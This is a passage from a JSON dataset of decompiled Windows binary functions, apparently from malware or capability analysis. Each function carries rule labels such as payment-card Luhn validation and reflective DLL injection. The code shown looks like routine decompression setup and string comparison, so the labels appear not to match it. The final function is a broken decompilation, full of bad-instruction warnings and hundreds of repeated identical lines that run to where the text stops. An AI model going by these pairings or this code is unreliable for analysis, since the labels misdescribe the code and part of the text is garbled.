        "decompiled_code": "\nint32_t __cdecl\nfcn.00406e60(uint32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, int32_t *arg_18h, uint arg_1ch, \n            uint arg_20h, uint arg_24h, int32_t arg_28h)\n\n{\n    int32_t arg_2ch;\n    int32_t iVar1;\n    uint var_4h;\n    \n    var_4h = 0;\n    arg_2ch = (**(arg_28h + 0x20))(*(arg_28h + 0x28), 0x120, 4);\n    if (arg_2ch == 0) {\n        return -4;\n    }\n    iVar1 = fcn.00406880(arg_10h, arg_8h, 0x101, 0x446500, 0x446580, arg_1ch, arg_14h, arg_24h, &var_4h, arg_2ch);\n    if (iVar1 == 0) {\n        if (*arg_14h != 0) {\n            iVar1 = fcn.00406880(arg_10h + arg_8h * 4, arg_ch, 0, 0x446600, \"2\\\"+;6*+6\", arg_20h, arg_18h, arg_24h, \n                                 &var_4h, arg_2ch);\n            if (iVar1 == 0) {\n                if ((*arg_18h != 0) || (arg_8h < 0x102)) {\n                    (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n                    return 0;\n                }\n            }\n            else {\n                if (iVar1 == -3) {\n                    *(arg_28h + 0x18) = 0x446bc8;\n                    (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n                    return -3;\n                }\n                if (iVar1 == -5) {\n                    *(arg_28h + 0x18) = 0x446bac;\n                    (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n                    return -3;\n                }\n                if (iVar1 == -4) goto code_r0x00406f90;\n            }\n            *(arg_28h + 0x18) = 0x446b88;\n            iVar1 = -3;\ncode_r0x00406f90:\n            (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n            return iVar1;\n        }\n    }\n    else {\n        if (iVar1 == -3) {\n            *(arg_28h + 0x18) = 0x446b64;\n            goto code_r0x00406fc5;\n        }\n        if (iVar1 == -4) goto code_r0x00406fc5;\n    }\n    *(arg_28h + 0x18) = 0x446b44;\n    iVar1 = -3;\ncode_r0x00406fc5:\n    (**(arg_28h + 0x24))(*(arg_28h + 0x28), arg_2ch);\n    return iVar1;\n}\n",
        "token_count": 766
    },
    "00407630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407630(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0042ba54(arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 47
    },
    "00407670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407670(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    \n    if ((arg_8h != 0) && (puVar1 = *(arg_8h + 0x1c),  puVar1 != NULL)) {\n        *(arg_8h + 0x14) = 0;\n        *(arg_8h + 8) = 0;\n        *(arg_8h + 0x18) = 0;\n        *puVar1 = -(puVar1[3] != 0) & 7;\n        fcn.004066a0(*(*(arg_8h + 0x1c) + 0x14), arg_8h, 0);\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 183
    },
    "00407710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407710(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        return 0xfffffffe;\n    }\n    *(arg_8h + 0x18) = 0;\n    if (*(arg_8h + 0x20) == 0) {\n        *(arg_8h + 0x20) = 0x406a30;\n        *(arg_8h + 0x28) = 0;\n    }\n    if (*(arg_8h + 0x24) == 0) {\n        *(arg_8h + 0x24) = 0x406a50;\n    }\n    iVar1 = (**(arg_8h + 0x20))(*(arg_8h + 0x28), 1, 0x18);\n    *(arg_8h + 0x1c) = iVar1;\n    if (iVar1 != 0) {\n        *(iVar1 + 0x14) = 0;\n        *(*(arg_8h + 0x1c) + 0xc) = 0;\n        *(*(arg_8h + 0x1c) + 0xc) = 1;\n        *(*(arg_8h + 0x1c) + 0x10) = 0xf;\n        iVar1 = fcn.00406730(arg_8h, ~-(*(*(arg_8h + 0x1c) + 0xc) != 0) & 0x4068f0, 0x8000);\n        *(*(arg_8h + 0x1c) + 0x14) = iVar1;\n        if (iVar1 != 0) {\n            fcn.00407670(arg_8h);\n            return 0;\n        }\n        fcn.004076c0(arg_8h);\n    }\n    return 0xfffffffc;\n}\n",
        "token_count": 437
    },
    "00407b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407b00(int32_t arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    char cVar2;\n    \n    arg_8h = arg_8h - arg_ch;\n    while( true ) {\n        cVar1 = arg_ch[arg_8h];\n        cVar2 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        if (cVar1 + 0x9fU < 0x1a) {\n            cVar1 = cVar1 + -0x20;\n        }\n        if (cVar2 + 0x9fU < 0x1a) {\n            cVar2 = cVar2 + -0x20;\n        }\n        if (cVar1 == '\\0') {\n            return -(cVar2 != '\\0');\n        }\n        if (cVar2 == '\\0') {\n            return 1;\n        }\n        if (cVar1 < cVar2) break;\n        if (cVar2 < cVar1) {\n            return 1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 246
    },
    "004080b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004080b0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h == 0) {\n        return -0x66;\n    }\n    *(arg_8h + 0x14) = *(arg_8h + 0x24);\n    *(arg_8h + 0x10) = 0;\n    iVar1 = fcn.00407d30(arg_8h, arg_8h + 0x28, arg_8h + 0x78, 0, 0, 0, 0, 0, 0);\n    *(arg_8h + 0x18) = iVar1 == 0;\n    return iVar1;\n}\n",
        "token_count": 170
    },
    "0040ab70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040ab70(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43d6fb;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    puVar2 = fcn.0042b2b1(0x244);\n    var_4h = 0;\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        *puVar2 = 0;\n        puVar2[1] = 0xffffffff;\n        puVar2[0x4d] = 0xffffffff;\n        puVar2[0x4e] = 0;\n        puVar2[0x4f] = 0;\n        if (arg_14h != 0) {\n            iVar3 = fcn.0042ad20(arg_14h, uVar1);\n            uVar4 = fcn.00429c39(iVar3 + 1);\n            puVar2[0x4e] = uVar4;\n            fcn.0042bb30(uVar4, arg_14h);\n        }\n    }\n    var_4h = 0xffffffff;\n    *0x452464 = fcn.0040a680(arg_8h, arg_ch, arg_10h);\n    if (*0x452464 != 0) {\n        if (puVar2 != NULL) {\n            if (puVar2[0x4e] != 0) {\n                fcn.0042bc28(puVar2[0x4e]);\n            }\n            puVar2[0x4e] = 0;\n            if (puVar2[0x4f] != 0) {\n                fcn.0042bc28(puVar2[0x4f]);\n            }\n            puVar2[0x4f] = 0;\n            fcn.0042a679(puVar2);\n        }\n        *in_FS_OFFSET = var_ch;\n        return NULL;\n    }\n    puVar5 = fcn.0042b2b1(8);\n    *puVar5 = 1;\n    puVar5[1] = puVar2;\n    *in_FS_OFFSET = var_ch;\n    return puVar5;\n}\n",
        "token_count": 616
    },
    "0040ac90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac90(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040ab70(arg_8h, arg_ch, 3, arg_10h);\n    return;\n}\n",
        "token_count": 56
    },
    "0040b0d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004671a3) overlaps instruction at (ram,0x004671a1)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00466731)\n// WARNING: Removing unreachable block (ram,0x004666c6)\n// WARNING: Removing unreachable block (ram,0x00466612)\n// WARNING: Removing unreachable block (ram,0x004665c1)\n// WARNING: Removing unreachable block (ram,0x0046664d)\n// WARNING: Removing unreachable block (ram,0x0046654f)\n// WARNING: Removing unreachable block (ram,0x00466551)\n// WARNING: Removing unreachable block (ram,0x004665b6)\n// WARNING: Removing unreachable block (ram,0x0046654a)\n// WARNING: Removing unreachable block (ram,0x004665c3)\n// WARNING: Removing unreachable block (ram,0x004665c6)\n// WARNING: Removing unreachable block (ram,0x004665c8)\n// WARNING: Removing unreachable block (ram,0x00466631)\n// WARNING: Removing unreachable block (ram,0x00466632)\n// WARNING: Removing unreachable block (ram,0x004666aa)\n// WARNING: Removing unreachable block (ram,0x0046645a)\n// WARNING: Removing unreachable block (ram,0x004664b8)\n// WARNING: Removing unreachable block (ram,0x004665de)\n// WARNING: Removing unreachable block (ram,0x00466656)\n// WARNING: Removing unreachable block (ram,0x00466669)\n// WARNING: Removing unreachable block (ram,0x0046666c)\n// WARNING: Removing unreachable block (ram,0x004666ae)\n// WARNING: Removing unreachable block (ram,0x004666e1)\n// WARNING: Removing unreachable block (ram,0x00466476)\n// WARNING: Removing unreachable block (ram,0x004664ee)\n// WARNING: Removing unreachable block (ram,0x00466564)\n// WARNING: Removing unreachable block (ram,0x004665dc)\n// WARNING: Removing unreachable block (ram,0x0046661e)\n// WARNING: Removing unreachable block (ram,0x004663c2)\n// WARNING: Removing unreachable block (ram,0x00466408)\n// WARNING: Removing unreachable block (ram,0x0046650e)\n// WARNING: Removing unreachable block (ram,0x00466588)\n// WARNING: Removing unreachable block (ram,0x004665c2)\n// WARNING: Removing unreachable block (ram,0x004665c7)\n// WARNING: Removing unreachable block (ram,0x004665da)\n// WARNING: Removing unreachable block (ram,0x00466549)\n// WARNING: Removing unreachable block (ram,0x00466552)\n// WARNING: Removing unreachable block (ram,0x00466560)\n// WARNING: Removing unreachable block (ram,0x00466568)\n// WARNING: Removing unreachable block (ram,0x00466675)\n// WARNING: Removing unreachable block (ram,0x00466677)\n// WARNING: Removing unreachable block (ram,0x004666dc)\n// WARNING: Removing unreachable block (ram,0x004665f9)\n// WARNING: Removing unreachable block (ram,0x00466617)\n// WARNING: Removing unreachable block (ram,0x00466619)\n// WARNING: Removing unreachable block (ram,0x0046661d)\n// WARNING: Removing unreachable block (ram,0x00466682)\n// WARNING: Removing unreachable block (ram,0x00466684)\n// WARNING: Removing unreachable block (ram,0x004666c2)\n// WARNING: Removing unreachable block (ram,0x004666c7)\n// WARNING: Removing unreachable block (ram,0x00466739)\n// WARNING: Removing unreachable block (ram,0x0046673b)\n// WARNING: Removing unreachable block (ram,0x0046673e)\n// WARNING: Removing unreachable block (ram,0x004668a8)\n// WARNING: Removing unreachable block (ram,0x00466788)\n// WARNING: Removing unreachable block (ram,0x0046658c)\n// WARNING: Removing unreachable block (ram,0x0046658e)\n// WARNING: Removing unreachable block (ram,0x00466586)\n// WARNING: Removing unreachable block (ram,0x00466435)\n// WARNING: Removing unreachable block (ram,0x00466437)\n// WARNING: Removing unreachable block (ram,0x00466386)\n// WARNING: Removing unreachable block (ram,0x004663ff)\n// WARNING: Removing unreachable block (ram,0x00466400)\n// WARNING: Removing unreachable block (ram,0x004665fe)\n// WARNING: Removing unreachable block (ram,0x00466600)\n// WARNING: Removing unreachable block (ram,0x0046668f)\n// WARNING: Removing unreachable block (ram,0x00466703)\n// WARNING: Removing unreachable block (ram,0x00466691)\n// WARNING: Removing unreachable block (ram,0x004666a6)\n// WARNING: Heritage AFTER dead removal. Example location: r0x00000000 : 0x00466488\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: ram\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.0040b0d0(uint arg_8h)\n\n{\n    uint16_t *puVar1;\n    uchar *puVar2;\n    char *pcVar3;\n    uchar uVar4;\n    uchar uVar5;\n    int16_t iVar6;\n    int16_t iVar7;\n    int64_t iVar8;\n    code *pcVar9;\n    uchar uVar10;\n    uchar uVar11;\n    uchar uVar12;\n    uchar uVar13;\n    char cVar14;\n    uint8_t uVar15;\n    uint8_t uVar16;\n    uint8_t uVar17;\n    uint8_t uVar18;\n    char cVar33;\n    uint32_t uVar19;\n    uint uVar20;\n    char *pcVar21;\n    char *pcVar22;\n    uint *puVar23;\n    int32_t iVar24;\n    uchar *puVar25;\n    char **ppcVar26;\n    char **ppcVar27;\n    uint32_t *puVar28;\n    uint8_t *puVar29;\n    uint8_t *puVar30;\n    uint8_t uVar34;\n    uint *puVar31;\n    int32_t *piVar32;\n    char cVar39;\n    uint extraout_ECX;\n    uint uVar35;\n    uint extraout_ECX_00;\n    uint32_t *puVar36;\n    uint32_t *puVar37;\n    uint32_t *puVar38;\n    uint32_t extraout_ECX_01;\n    uint8_t uVar40;\n    int16_t iVar41;\n    ushort uVar42;\n    uint32_t *puVar43;\n    uint unaff_EBX;\n    uint16_t uVar44;\n    uchar *puVar45;\n    uint unaff_EBP;\n    uint32_t *puVar47;\n    uint unaff_ESI;\n    uint32_t *puVar48;\n    uint32_t *puVar49;\n    uint32_t *puVar50;\n    uint unaff_EDI;\n    uint32_t uVar51;\n    ushort *puVar52;\n    uint16_t in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_GS;\n    int32_t in_FS_OFFSET;\n    int32_t in_GS_OFFSET;\n    bool bVar53;\n    uint8_t in_AF;\n    bool bVar54;\n    uint64_t uVar55;\n    uchar unaff_retaddr;\n    ushort unaff_retaddr_00;\n    uchar unaff_retaddr_01;\n    uchar in_stack_00000008;\n    uint8_t in_stack_00000009;\n    char in_stack_0000000a;\n    ushort in_stack_0000000b;\n    uchar in_stack_0000000d;\n    uchar in_stack_0000000e;\n    ushort in_stack_0000000f;\n    ushort in_stack_00000011;\n    ushort in_stack_00000013;\n    ushort in_stack_00000015;\n    ushort in_stack_00000017;\n    ushort in_stack_00000019;\n    ushort in_stack_0000001b;\n    ushort in_stack_0000001d;\n    ushort in_stack_0000001f;\n    uint32_t *in_stack_00000021;\n    uint32_t *in_stack_00000025;\n    int32_t in_stack_00000029;\n    uint8_t uStack0000002d;\n    uint32_t *in_stack_0000002d;\n    uint32_t *in_stack_00000031;\n    uint32_t *in_stack_00000035;\n    char **in_stack_00000039;\n    uint32_t *in_stack_0000003d;\n    uint32_t *in_stack_00000041;\n    uint32_t *in_stack_00000045;\n    uchar uStack00000049;\n    ushort uStack0000004a;\n    uint32_t *in_stack_0000004c;\n    unkbyte3 Stack0000004d;\n    uint8_t in_stack_00000050;\n    uchar in_stack_00000051;\n    uchar in_stack_00000052;\n    uchar in_stack_00000053;\n    uchar in_stack_00000054;\n    ushort in_stack_00000055;\n    uchar in_stack_00000057;\n    uchar uStack00000058;\n    uint32_t *in_stack_00000058;\n    unkbyte3 Stack00000059;\n    uchar uStack0000005c;\n    uint32_t in_stack_0000005c;\n    unkbyte3 Stack0000005d;\n    uchar uStack00000060;\n    uint32_t *in_stack_00000060;\n    unkbyte3 Stack00000061;\n    uchar in_stack_00000064;\n    int16_t in_stack_00000065;\n    uchar in_stack_00000067;\n    uchar in_stack_00000068;\n    char in_stack_00000069;\n    uchar in_stack_0000006a;\n    uchar in_stack_0000006b;\n    uint8_t in_stack_0000006c;\n    char in_stack_0000006d;\n    uchar in_stack_0000006e;\n    uchar in_stack_0000006f;\n    uchar in_stack_00000070;\n    uchar in_stack_00000071;\n    uchar in_stack_00000072;\n    uint8_t in_stack_00000073;\n    uchar in_stack_00000074;\n    uchar in_stack_00000075;\n    uchar in_stack_00000076;\n    uchar in_stack_00000077;\n    uchar in_stack_00000078;\n    ushort in_stack_00000079;\n    uchar in_stack_0000007b;\n    uchar in_stack_0000007c;\n    ushort in_stack_0000007d;\n    uchar in_stack_0000007f;\n    uint8_t in_stack_00000080;\n    ushort in_stack_00000081;\n    uint8_t in_stack_00000083;\n    uint8_t in_stack_00000084;\n    ushort in_stack_00000085;\n    uchar in_stack_00000087;\n    uchar in_stack_00000088;\n    uchar in_stack_00000089;\n    uchar in_stack_0000008a;\n    uchar in_stack_0000008b;\n    uchar in_stack_0000008c;\n    uchar in_stack_0000008d;\n    char in_stack_0000008e;\n    uchar in_stack_0000008f;\n    uint32_t *in_stack_00000091;\n    uint32_t *in_stack_00000095;\n    uint32_t *in_stack_00000099;\n    uint32_t *in_stack_0000009d;\n    uint32_t *in_stack_000000a5;\n    uint32_t *in_stack_000000a9;\n    uint32_t *in_stack_000000ad;\n    int32_t in_stack_000000b1;\n    uchar uStack36;\n    unkbyte3 Stack35;\n    uchar uStack16;\n    uint8_t uStack15;\n    uchar uStack14;\n    uchar uStack13;\n    uint var_8h;\n    uint var_4h;\n    uchar uStack4;\n    uchar uStack3;\n    uint8_t uStack2;\n    char cStack1;\n    uint32_t uVar46;\n    \n    uStack4 = unaff_EBP;\n    uStack3 = unaff_EBP >> 8;\n    uStack2 = unaff_EBP >> 0x10;\n    cStack1 = unaff_EBP >> 0x18;\n    uStack16 = unaff_ESI;\n    uStack15 = unaff_ESI >> 8;\n    uVar16 = uStack15;\n    uStack14 = unaff_ESI >> 0x10;\n    uVar5 = uStack14;\n    uStack13 = unaff_ESI >> 0x18;\n    uVar11 = uStack13;\n    uVar19 = (**0x463094)();\n    uVar20 = (**0x46301c)();\n    (**0x463038)();\n    var_4h._0_1_ = 0x2c;\n    var_4h._1_1_ = 0;\n    pcVar21 = fcn.0042d26d(uVar20, &var_4h, &var_8h);\n    if (pcVar21 != NULL) {\n        uVar51 = 0;\n        uVar35 = extraout_ECX;\n        do {\n            uVar13 = cStack1;\n            uVar10 = uStack2;\n            uVar12 = var_8h;\n            switch(uVar51) {\n            case 0:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 1:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 2:\n                cVar14 = pcVar21;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                *pcVar21 = *pcVar21 + cVar14;\n                